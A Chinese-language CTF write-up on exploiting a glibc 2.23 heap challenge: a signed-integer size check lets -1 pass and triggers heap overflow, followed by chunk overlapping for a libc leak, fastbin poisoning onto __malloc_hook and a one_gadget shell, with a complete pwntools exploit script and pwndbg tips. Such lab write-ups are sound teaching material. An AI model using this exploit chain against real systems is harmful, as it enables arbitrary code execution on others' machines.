---
title: FastBin Attack 整数溢出堆利用实战
date: 2026-05-10 21:32:00
categories:
  - pwn
tags:
  - 堆利用
  - Fastbin
  - 整数溢出
  - One Gadget
  - glibc 2.23
---

> glibc 2.23 经典堆利用 | Chunk Overlapping + Fastbin Poisoning + One Gadget

## 0x01 题目环境

- **漏洞类型**：Integer Overflow (整数溢出) 导致的 Heap Overflow (堆溢出)
- **利用手法**：Chunk Overlapping + Fastbin Poisoning + One Gadget
- **运行环境**：glibc 2.23 (Ubuntu 16.04 经典堆机制)
- **保护机制**：开启了 ASLR、NX、PIE 和 Canary

## 0x02 核心漏洞分析

通过对程序的逆向分析，发现在 `delete` 函数中，程序在释放堆块后会严格地将指针置空（`*(&ptr + v1) = 0LL`），因此**不存在常规的 UAF 或 Double Free 漏洞**。

真正的致命漏洞隐藏在 `edit` 函数中：

```c
int nbytes; // 这是一个【有符号】整数 (Signed Integer)
__isoc99_scanf("%d", &nbytes);
if ( nbytes <= 96 ) // 漏洞点：防线被击穿
{
    // nbytes 被转换为无符号整数 size_t
    read(0, *(&ptr + nbytes_4), (unsigned int)nbytes); 
}
```

这里存在经典的**符号位安全隐患 (Signedness Bug)**。当我们输入大小为 `-1` 时，`-1 <= 96` 的判断条件成立。但在进入 `read` 函数时，`-1` 被强制转换为无符号整数 `0xFFFFFFFF`（近 4GB）。这使得我们可以对一个仅有 `0x60` 字节的堆块写入任意长度的数据，构成了极为严重的**堆溢出 (Heap Overflow)**。

## 0x03 攻击利用思路

题目在 `add` 功能中写死了只能申请固定大小 `0x60`（实际 Chunk Size 为 `0x70`）的堆块。这就要求我们必须利用堆溢出，手动伪造堆块结构来打通攻击链。

### Step 1: 伪造 Chunk 泄露 Libc 基址

由于所有的 Chunk 都是 Fastbin 大小，直接 `free` 不会产生包含 `main_arena` 指针的 Unsorted Bin。

**初始内存布局**：连续申请 4 个 chunk（0, 1, 2, 3），它们在内存中紧挨着。

```
           +-------------------------+
Chunk 0 -> | prev_size = 0           |
           | size = 0x71             |
           | user_data (0x60 bytes)  |
           +-------------------------+
Chunk 1 -> | prev_size = 0           |
           | size = 0x71             | <--- 目标：修改这里
           | user_data (0x60 bytes)  |
           +-------------------------+
Chunk 2 -> | prev_size = 0           |
           | size = 0x71             |
           | user_data (0x60 bytes)  |
           +-------------------------+
Chunk 3 -> | prev_size = 0           |
           | size = 0x71             |
           +-------------------------+
```

**触发溢出，篡改 Chunk 1 的 Size**：通过 `edit(0, -1, payload)` 溢出 Chunk 0，将 Chunk 1 的 size 从 `0x71` 修改为 `0xe1`（相当于将 Chunk 1 和 Chunk 2 在逻辑上合并）。

```
           +-------------------------+
Chunk 1 -> | prev_size = 0           |
           | size = 0xe1 (伪造大小)  | <--- 系统认为 Chunk1 有 0xe0 这么大
           | user_data (0x60 bytes)  |
           +-------------------------+
Chunk 2 -> | (原本 Chunk 2 的 header) | <--- 被包裹在伪造的 Chunk1 内部
           | user_data               |
           +-------------------------+
```

**释放与切割**：执行 `delete(1)`，系统读取到 size 为 `0xe0`，放入 **Unsorted Bin**。再次 `add()` 时，系统从 `0xe0` 大块中切下前一半分配，**剩下的一半刚好落在原本 Chunk 2 的位置**，其 `fd` 包含 `main_arena+88` 地址。

```
           +-------------------------+
Chunk 2 -> | size = 0x71 (新Unsorted)| <--- Unsorted Bin 新头部
           | fd = main_arena+88      | <--- libc 内部地址
           | bk = main_arena+88      |
           +-------------------------+
```

此时 `show(2)` 即可泄露 Libc 基址。

### Step 2: Fastbin Poisoning (劫持 fd 指针)

**目标**：把 Fastbin 的 `fd` 改写为 `__malloc_hook` 附近的地址。

**为什么是 `__malloc_hook - 0x23`？** 申请块时系统会检查目标地址的 `size` 是否合法。在 glibc 2.23 的 `__malloc_hook` 前方，内存中天然存在一个 `0x7f` 字节：

```
0x7f...aaf8:  00 00 00 00 00 00 00 7f <--- 天然的 0x7f
0x7f...ab10:  [__malloc_hook 变量本体]
```

将 fake chunk 起始地址设为 `__malloc_hook - 0x23`，天然的 `0x7f` 刚好落在 size 字段，通过 Fastbin 安全检查。

**溢出覆盖 fd**：
- 执行 `delete(4)`，Chunk 4 进入 Fastbin
- 利用堆溢出覆盖 Chunk 4 的 `fd` 为 `__malloc_hook - 0x23`

### Step 3: 触发 One Gadget (Get Shell)

1. 连续两次分配 `0x60`，第二次分配到 `__malloc_hook` 附近
2. 覆写 `__malloc_hook` 为 `one_gadget` 地址
3. 调用 `add` 触发 `malloc`，跳转执行 `one_gadget` 获取 Shell

## 0x04 Exploit 代码

```python
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

p = remote('challenge-9da23e04d2452171.sandbox.ctfhub.com', 31728)
libc = ELF('./libc-2.23.so')

def add():
    p.recvuntil(b'>> ')
    p.sendline(b'1')

def delete(idx):
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b'Index:\n')
    p.sendline(str(idx).encode())

def show(idx):
    p.recvuntil(b'>> ')
    p.sendline(b'3')
    p.recvuntil(b'Index:\n')
    p.sendline(str(idx).encode())

def edit(idx, size, content):
    p.recvuntil(b'>> ')
    p.sendline(b'4')
    p.recvuntil(b'Index:\n')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Size:\n')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content:\n')
    p.send(content)

# Step 1: Leak Libc via Unsorted Bin
add() # chunk 0
add() # chunk 1
add() # chunk 2
add() # chunk 3

# 触发整数溢出，修改 chunk 1 的 size 为 0xe1
payload1 = b'a' * 0x60 + p64(0) + p64(0xe1)
edit(0, -1, payload1)

# 释放伪造块进入 Unsorted bin
delete(1)

# 重新分配切割 Unsorted bin，使 main_arena 指针落入 chunk 2
add()
show(2)

p.recvuntil(b'Content: ')
leak_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success("Leaked main_arena+88: " + hex(leak_addr))

libc_base = leak_addr - 0x3c4b78
malloc_hook = libc_base + libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 0x23

log.success("Libc base: " + hex(libc_base))
log.success("__malloc_hook: " + hex(malloc_hook))

# Step 2: Overwrite Fastbin fd
add() # 拿到 index 4
delete(4) # 将 chunk 4 放入 fastbin

# 利用 chunk 1 溢出，覆盖 chunk 4 的 fd 指针
payload2 = b'b' * 0x60 + p64(0) + p64(0x71) + p64(fake_chunk)
edit(1, -1, payload2)

# Step 3: Trigger __malloc_hook
add() # 拿回正常的 chunk 4
add() # 拿到分配在 __malloc_hook 附近的 fake_chunk (index 5)

# 使用 one_gadget 覆盖 __malloc_hook
one_gadget = libc_base + 0x4527a
payload_hook = b'c' * 0x13 + p64(one_gadget)
edit(5, 96, payload_hook)

# 最后一次调用 malloc 触发 hook
add()
p.interactive()
```

## 0x05 调试技巧 (Pwndbg)

| 命令 | 用途 |
|------|------|
| `heap` / `vis` | 查看堆块结构，确认 size 是否被篡改为 0xe1 |
| `fastbins` | 查看 Fastbin 链表，确认 fd 劫持成功：`0x70: 0x... -> __malloc_hook-0x23 -> 0x0` |
| `arena` | 确认 Unsorted Bin 是否正确挂载 |
| `x/32gx &__malloc_hook - 0x30` | 寻找天然的 `0x7f` 数据，计算 fake_chunk 偏移 |

## 0x06 核心考点

- **Signedness Bug**：`scanf("%d")` 配合 `read/recv` 时警惕负数绕过，直接赋予任意堆块无限溢出能力
- **Chunk Overlapping**：伪造大块进入 Unsorted Bin，利用切割机制泄露 Libc
- **Fastbin Poisoning**：利用错位构造（Misaligned chunk）绕过 size 安全检查
- **One Gadget**：覆盖 `__malloc_hook` 实现代码执行
